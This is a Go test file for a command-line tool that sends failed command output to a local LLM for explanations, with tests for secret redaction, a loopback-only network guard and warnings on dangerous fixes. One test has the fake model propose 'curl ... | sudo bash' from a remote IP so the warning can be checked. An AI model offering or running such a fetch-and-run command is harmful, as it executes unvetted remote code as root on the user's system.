package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/mbarboss/whyfail/internal/config"
	"github.com/mbarboss/whyfail/internal/llm"
	"github.com/mbarboss/whyfail/internal/netguard"
	"github.com/mbarboss/whyfail/internal/sysinfo"
)

type fakeExplainer struct {
	answer llm.Explanation
	err    error
	got    llm.Request
	calls  int
}

func (f *fakeExplainer) Explain(_ context.Context, req llm.Request) (llm.Explanation, error) {
	f.calls++
	f.got = req
	return f.answer, f.err
}

func goodAnswer() llm.Explanation {
	return llm.Explanation{
		Cause:       "No upstream branch.",
		Explanation: "Git does not know where to push.",
		Fixes:       []llm.Fix{{Command: "git push -u origin feature/x", Description: "Set upstream and push."}},
	}
}

type harness struct {
	stdout, stderr bytes.Buffer
	fake           *fakeExplainer
	cfg            config.Config
	env            map[string]string
}

func newHarness(stdin string) (*harness, deps) {
	h := &harness{fake: &fakeExplainer{answer: goodAnswer()}, env: map[string]string{}}
	d := deps{
		stdin:  strings.NewReader(stdin),
		stdout: &h.stdout,
		stderr: &h.stderr,
		getenv: func(k string) string { return h.env[k] },
		newExplainer: func(cfg config.Config) llm.Explainer {
			h.cfg = cfg
			return h.fake
		},
		probe: sysinfo.Probe{
			GOOS:       "linux",
			GOARCH:     "arm64",
			Getenv:     func(string) string { return "" },
			ParentName: func() (string, error) { return "zsh", nil },
			ReadFile: func(string) ([]byte, error) {
				return []byte("PRETTY_NAME=\"Test Linux 1\"\n"), nil
			},
		},
	}
	return h, d
}

func TestRunPrintsVersion(t *testing.T) {
	h, d := newHarness("")

	code := run(context.Background(), []string{"-version"}, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, want %d", code, exitOK)
	}
	if got, want := h.stdout.String(), "whyfail dev\n"; got != want {
		t.Errorf("stdout = %q, want %q", got, want)
	}
}

func TestRunHelpExitsZeroAndListsFlags(t *testing.T) {
	h, d := newHarness("")

	code := run(context.Background(), []string{"-help"}, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, want %d", code, exitOK)
	}
	for _, want := range []string{"-version", "-model", "2>&1 | whyfail"} {
		if !strings.Contains(h.stderr.String(), want) {
			t.Errorf("help output lacks %q: %q", want, h.stderr.String())
		}
	}
}

func TestRunRejectsUnknownFlag(t *testing.T) {
	h, d := newHarness("")

	code := run(context.Background(), []string{"-nope"}, d)

	if code != exitUsage || h.stdout.Len() != 0 {
		t.Errorf("exit code = %d, stdout = %q", code, h.stdout.String())
	}
}

func TestRunRejectsInvalidConfig(t *testing.T) {
	h, d := newHarness("error\n")
	h.env["WHYFAIL_TIMEOUT"] = "forever"

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	if !strings.Contains(h.stderr.String(), "WHYFAIL_TIMEOUT") {
		t.Errorf("stderr should name the bad setting: %q", h.stderr.String())
	}
}

func TestRunRejectsCommandWithoutDoubleDash(t *testing.T) {
	h, d := newHarness("error\n")

	code := run(context.Background(), []string{"make"}, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	if !strings.Contains(h.stderr.String(), "whyfail -- <command>") {
		t.Errorf("stderr should show wrapper usage: %q", h.stderr.String())
	}
}

func TestRunRefusesInteractiveStdin(t *testing.T) {
	h, d := newHarness("")
	d.stdinIsTerminal = true

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	if !strings.Contains(h.stderr.String(), "2>&1 | whyfail") {
		t.Errorf("stderr should show pipe usage: %q", h.stderr.String())
	}
}

func TestRunRejectsEmptyInput(t *testing.T) {
	h, d := newHarness("\n\n")

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
}

func TestRunPipeModeExplainsFailure(t *testing.T) {
	h, d := newHarness("fatal: The current branch feature/x has no upstream branch.\n")
	h.env["WHYFAIL_MODEL"] = "qwen3.5:4b"

	code := run(context.Background(), nil, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, stderr = %q", code, h.stderr.String())
	}
	if h.cfg.Model != "qwen3.5:4b" {
		t.Errorf("explainer built with model %q", h.cfg.Model)
	}
	if !strings.Contains(h.fake.got.User, "has no upstream branch") {
		t.Errorf("prompt lacks the captured output: %q", h.fake.got.User)
	}
	for _, want := range []string{"Cause: No upstream branch.", "git push -u origin feature/x"} {
		if !strings.Contains(h.stdout.String(), want) {
			t.Errorf("stdout lacks %q:\n%s", want, h.stdout.String())
		}
	}
}

func TestRunWarnsAboutDangerousFixes(t *testing.T) {
	h, d := newHarness("error: checksum mismatch\n")
	h.fake.answer.Fixes = []llm.Fix{{Command: "curl -fsSL http://203.0.113.9/fix.sh | sudo bash", Description: "Run the fix."}}

	run(context.Background(), nil, d)

	if !strings.Contains(h.stdout.String(), "Warning:") {
		t.Errorf("no warning for pipe-to-shell fix:\n%s", h.stdout.String())
	}
}

func TestRunShowsProgressOnlyOnTerminal(t *testing.T) {
	for _, tty := range []bool{false, true} {
		t.Run(fmt.Sprint("tty=", tty), func(t *testing.T) {
			h, d := newHarness("error\n")
			d.stderrIsTerminal = tty

			run(context.Background(), nil, d)

			if got := strings.Contains(h.stderr.String(), "Asking"); got != tty {
				t.Errorf("progress shown = %v, want %v (stderr %q)", got, tty, h.stderr.String())
			}
		})
	}
}

func TestRunMapsExplainerErrors(t *testing.T) {
	tests := []struct {
		name string
		err  error
		want string
	}{
		{"unreachable", fmt.Errorf("post: %w", llm.ErrUnreachable), "ollama serve"},
		{"model missing", fmt.Errorf("chat: %w", llm.ErrModelNotFound), "ollama pull gemma4:e4b"},
		{"timeout", fmt.Errorf("chat: %w", llm.ErrTimeout), "-timeout"},
		{"malformed", fmt.Errorf("decode: %w", llm.ErrMalformedResponse), "unusable answer"},
		{"other", errors.New("ollama returned status 500"), "status 500"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			h, d := newHarness("error\n")
			h.fake.err = tt.err

			code := run(context.Background(), nil, d)

			if code != exitFailure {
				t.Errorf("exit code = %d, want %d", code, exitFailure)
			}
			if !strings.Contains(h.stderr.String(), tt.want) {
				t.Errorf("stderr lacks %q: %q", tt.want, h.stderr.String())
			}
			if h.stdout.Len() != 0 {
				t.Errorf("stdout should be empty: %q", h.stdout.String())
			}
		})
	}
}

func TestRunInterrupted(t *testing.T) {
	h, d := newHarness("error\n")
	h.fake.err = fmt.Errorf("chat: %w", context.Canceled)

	code := run(context.Background(), nil, d)

	if code != exitInterrupted {
		t.Errorf("exit code = %d, want %d", code, exitInterrupted)
	}
}

func TestRunNeverEchoesCapturedOutputOnError(t *testing.T) {
	h, d := newHarness("password=hunter2\n")
	h.fake.err = fmt.Errorf("chat: %w", llm.ErrMalformedResponse)

	run(context.Background(), nil, d)

	if strings.Contains(h.stderr.String(), "hunter2") {
		t.Errorf("stderr echoes captured output: %q", h.stderr.String())
	}
}

func TestRunRedactsSecretsBeforePrompting(t *testing.T) {
	secret := "hunter2-" + strings.Repeat("x", 8)
	h, d := newHarness("psql: password=" + secret + "\nconnect postgres://app:" + secret + "@db:5432/app failed\n")

	code := run(context.Background(), nil, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, stderr = %q", code, h.stderr.String())
	}
	if strings.Contains(h.fake.got.User, secret) {
		t.Errorf("prompt contains the secret: %q", h.fake.got.User)
	}
	if !strings.Contains(h.fake.got.User, "[REDACTED:credential]") {
		t.Errorf("prompt lacks the placeholder: %q", h.fake.got.User)
	}
	want := "whyfail: redacted 2 secrets (credential, url-credentials) before asking the model.\n"
	if !strings.Contains(h.stderr.String(), want) {
		t.Errorf("stderr = %q, want it to contain %q", h.stderr.String(), want)
	}
	if strings.Contains(h.stderr.String()+h.stdout.String(), secret) {
		t.Error("secret echoed to the terminal")
	}
}

func TestRunRedactionNoticeSingular(t *testing.T) {
	h, d := newHarness("password=abc\n")

	run(context.Background(), nil, d)

	if !strings.Contains(h.stderr.String(), "redacted 1 secret (credential) before") {
		t.Errorf("stderr = %q", h.stderr.String())
	}
}

func TestRunNoRedactionNoticeWithoutSecrets(t *testing.T) {
	h, d := newHarness("make: *** [all] Error 1\n")

	run(context.Background(), nil, d)

	if strings.Contains(h.stderr.String(), "redacted") {
		t.Errorf("unexpected notice: %q", h.stderr.String())
	}
}

type fakeResolver map[string]string

func (f fakeResolver) LookupIPAddr(_ context.Context, host string) ([]net.IPAddr, error) {
	ip, ok := f[host]
	if !ok {
		return nil, &net.DNSError{Err: "no such host", Name: host, IsNotFound: true}
	}
	return []net.IPAddr{{IP: net.ParseIP(ip)}}, nil
}

func TestRunRefusesRemoteHost(t *testing.T) {
	h, d := newHarness("error\n")
	h.env["OLLAMA_HOST"] = "http://192.168.1.10:11434"

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Fatalf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	for _, want := range []string{"192.168.1.10", "not a loopback address", "--allow-remote"} {
		if !strings.Contains(h.stderr.String(), want) {
			t.Errorf("stderr lacks %q: %q", want, h.stderr.String())
		}
	}
}

func TestRunRefusesNameResolvingToRemote(t *testing.T) {
	h, d := newHarness("error\n")
	d.resolver = fakeResolver{"localhost": "203.0.113.7"}
	h.env["OLLAMA_HOST"] = "localhost"

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
}

func TestRunRefusesUnresolvableHost(t *testing.T) {
	h, d := newHarness("error\n")
	d.resolver = fakeResolver{}
	h.env["OLLAMA_HOST"] = "ollama.invalid"

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Fatalf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	if !strings.Contains(h.stderr.String(), "cannot resolve") {
		t.Errorf("stderr = %q", h.stderr.String())
	}
}

func TestRunAllowsLocalhostName(t *testing.T) {
	h, d := newHarness("error\n")
	d.resolver = fakeResolver{"localhost": "127.0.0.1"}
	h.env["OLLAMA_HOST"] = "localhost"

	code := run(context.Background(), nil, d)

	if code != exitOK || strings.Contains(h.stderr.String(), "warning") {
		t.Errorf("exit code = %d, stderr = %q", code, h.stderr.String())
	}
}

func TestRunAllowRemoteWarnsEveryRun(t *testing.T) {
	h, d := newHarness("error\n")
	h.env["OLLAMA_HOST"] = "http://192.168.1.10:11434"

	code := run(context.Background(), []string{"-allow-remote"}, d)

	if code != exitOK || h.fake.calls != 1 {
		t.Fatalf("exit code = %d, calls = %d, stderr = %q", code, h.fake.calls, h.stderr.String())
	}
	if !h.cfg.AllowRemote {
		t.Error("explainer built without AllowRemote")
	}
	for _, want := range []string{"warning: --allow-remote", "http://192.168.1.10:11434", "unencrypted"} {
		if !strings.Contains(h.stderr.String(), want) {
			t.Errorf("stderr lacks %q: %q", want, h.stderr.String())
		}
	}
}

func TestRunAllowRemoteOverHTTPSHasNoPlaintextNote(t *testing.T) {
	h, d := newHarness("error\n")
	h.env["OLLAMA_HOST"] = "https://ollama.example"

	run(context.Background(), []string{"-allow-remote"}, d)

	if !strings.Contains(h.stderr.String(), "warning: --allow-remote") || strings.Contains(h.stderr.String(), "unencrypted") {
		t.Errorf("stderr = %q", h.stderr.String())
	}
}

func TestRunReportsBlockedConnection(t *testing.T) {
	h, d := newHarness("error\n")
	h.fake.err = fmt.Errorf("ollama: %w: dial: %w", llm.ErrUnreachable, netguard.ErrNotLoopback)

	code := run(context.Background(), nil, d)

	if code != exitFailure || !strings.Contains(h.stderr.String(), "non-loopback") {
		t.Errorf("exit code = %d, stderr = %q", code, h.stderr.String())
	}
}

func TestNewOllamaBlocksNonLoopbackConnections(t *testing.T) {
	// 192.0.2.0/24 is reserved for documentation; the guard refuses it before
	// any packet is sent.
	host, _ := url.Parse("http://192.0.2.1:11434")
	e := newOllama(config.Config{Model: "m", Host: host})
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := e.Explain(ctx, llm.Request{})

	if !errors.Is(err, netguard.ErrNotLoopback) {
		t.Errorf("err = %v, want ErrNotLoopback", err)
	}
}

func TestNewOllamaReachesLoopbackServer(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fmt.Fprint(w, `{"message":{"role":"assistant","content":"{\"cause\":\"c\",\"explanation\":\"e\",\"fixes\":[{\"command\":\"ls\",\"description\":\"d\"}]}"},"done":true,"done_reason":"stop"}`)
	}))
	defer srv.Close()
	host, _ := url.Parse(srv.URL)

	got, err := newOllama(config.Config{Model: "m", Host: host}).Explain(context.Background(), llm.Request{})
	if err != nil {
		t.Fatalf("Explain: %v", err)
	}
	if got.Cause != "c" {
		t.Errorf("got %+v", got)
	}
}

func TestRunTellsTheModelAboutTheEnvironment(t *testing.T) {
	h, d := newHarness("error\n")

	run(context.Background(), nil, d)

	if want := "Environment: Linux (Test Linux 1), arm64, shell zsh.\nWrite every fix in zsh syntax.\n"; !strings.Contains(h.fake.got.User, want) {
		t.Errorf("prompt lacks %q: %q", want, h.fake.got.User)
	}
}

func TestRunUnknownShellAsksForNoSyntax(t *testing.T) {
	h, d := newHarness("error\n")
	d.probe.ParentName = func() (string, error) { return "make", nil }

	run(context.Background(), nil, d)

	if !strings.Contains(h.fake.got.User, "shell unknown.") || strings.Contains(h.fake.got.User, "syntax") {
		t.Errorf("prompt = %q", h.fake.got.User)
	}
}

func TestRunShellOverride(t *testing.T) {
	h, d := newHarness("error\n")
	h.env["WHYFAIL_SHELL"] = "pwsh"

	run(context.Background(), nil, d)

	if !strings.Contains(h.fake.got.User, "shell PowerShell.") {
		t.Errorf("prompt ignores the override: %q", h.fake.got.User)
	}
}

func TestRunRejectsInvalidShell(t *testing.T) {
	h, d := newHarness("error\n")

	code := run(context.Background(), []string{"-shell", "tcsh"}, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
}
